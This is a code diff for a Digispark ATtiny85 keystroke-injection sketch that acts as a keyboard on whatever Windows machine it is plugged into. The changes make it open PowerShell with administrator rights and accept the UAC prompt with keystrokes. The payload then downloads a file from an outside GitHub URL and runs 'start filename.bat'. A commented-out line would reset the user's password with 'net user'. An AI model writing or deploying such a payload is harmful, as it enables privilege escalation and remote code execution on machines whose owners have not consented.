@@ -10,12 +10,18 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("powershell");
+  DigiKeyboard.print("powershell start-process powershell -verb runas");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  // DigiKeyboard.delay(500);
+  // DigiKeyboard.print("net user $env:Username newpassword");
+  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/bannyvishwas/attiny85/master/docs/urls.txt' , 'urls.txt')");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
@@ -28,7 +34,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print("start filename.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){
